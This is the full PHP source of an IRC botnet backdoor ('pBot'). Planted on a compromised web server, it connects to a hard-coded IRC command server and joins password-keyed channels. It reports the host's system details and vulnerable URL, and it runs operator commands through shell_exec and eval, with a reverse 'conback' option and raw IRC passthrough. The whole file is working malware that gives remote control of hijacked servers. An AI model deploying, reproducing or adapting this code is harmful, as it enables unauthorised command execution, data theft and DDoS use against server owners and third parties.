<?php
set_time_limit(0);
error_reporting(0);
echo "ok!";
class pBot{
var $config = array("server"=>"irc.neraka.co.vu",
"port"=>"6667",
"pass"=>"memek",
"prefix"=>"pbot",
"maxrand"=>"2",
"chan"=>"#berkah",
"chan2"=>"#neraka",
"key"=>"correct",
"modes"=>"+ps"
);
var $users = array();
function start(){
if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
$this->start();
$ident = $this->config['prefix'];
$alph = range("0","9");
for($i=0;$i<$this->config['maxrand'];$i++)
$ident .= $alph[rand(0,9)];
if(strlen($this->config['pass'])>0)
$this->send("PASS ".$this->config['pass']);
$this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
$this->send("NICK ".get_current_user()."");
$this->main();
}
function main(){
while(!feof($this->conn)){
$this->buf = trim(fgets($this->conn,512));
$cmd = explode(" ",$this->buf);
if(substr($this->buf,0,6)=="PING :"){
$this->send("PONG :".substr($this->buf,6));
}
if(isset($cmd[1]) && $cmd[1] =="001"){
$this->send("MODE ".$this->nick." ".$this->config['modes']);
$this->join($this->config['chan'],$this->config['key']);
$this->join($this->config['chan2'],$this->config['key']);
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"[\2uname!\2]: $uname (safe: $safemode)");
}
if(isset($cmd[1]) && $cmd[1]=="433"){
$this->set_nick();
}
if($this->buf != $old_buf){
$mcmd = array();
$msg = substr(strstr($this->buf," :"),2);
$msgcmd = explode(" ",$msg);
$nick = explode("!",$cmd[0]);
$vhost = explode("@",$nick[1]);
$vhost = $vhost[1];
$nick = substr($nick[0],1);
$host = $cmd[0];
if($msgcmd[0]==$this->nick){
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i+1];
}
else{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i];
}
if(count($cmd)>2){
switch($cmd[1]){
case "PRIVMSG":
if(substr($mcmd[0],0,1)=="!"){
switch(substr($mcmd[0],1)){
case "reload":
$this->send("QUIT :restart commando from $nick");
fclose($this->conn);
$this->start();
break;
case "safe":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){
$safemode = "on";
}
else {
$safemode = "off";
}
$this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
break;
case "conback":
if(count($mcmd)>2){
$this->conback($mcmd[1],$mcmd[2]);
}
break;
case "dns":
if(isset($mcmd[1])){
$ip = explode(".",$mcmd[1]);
if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])){
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
}
else{
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
}
}
break;
case "info":
case "vuln":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
$this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
break;
case "bot":
$this->privmsg($this->config['chan'],"[\2bot\2]: phpbotx");
break;
case "uname":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
break;
case "rndnick":
$this->set_nick();
break;
case "raw":
$this->send(strstr($msg,$mcmd[1]));
break;
case "eval":
$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
break;
case "cmd":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = shell_exec($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
case "mati":
$this->send("QUIT : $nick Pasukan-ddos-ReloaD-X");
fclose($this->conn);
exit;
}
}
break;
}
}
}
$old_buf = $this->buf;
}
$this->start();
}
function send($msg){
fwrite($this->conn,"$msg\r\n");
}
function join($chan,$key=NULL){
$this->send("JOIN $chan $key");
}
function privmsg($to,$msg){
$this->send("PRIVMSG $to :$msg");
}
function notice($to,$msg){
$this->send("NOTICE $to :$msg");
}
function set_nick(){
$this->nick = get_current_user();
for($i=0;$i<$this->config['maxrand'];$i++)
$this->nick .= mt_rand(0,9);
$this->send("NICK ".$this->nick);
}
}
$bot = new pBot;
$bot->start();
?>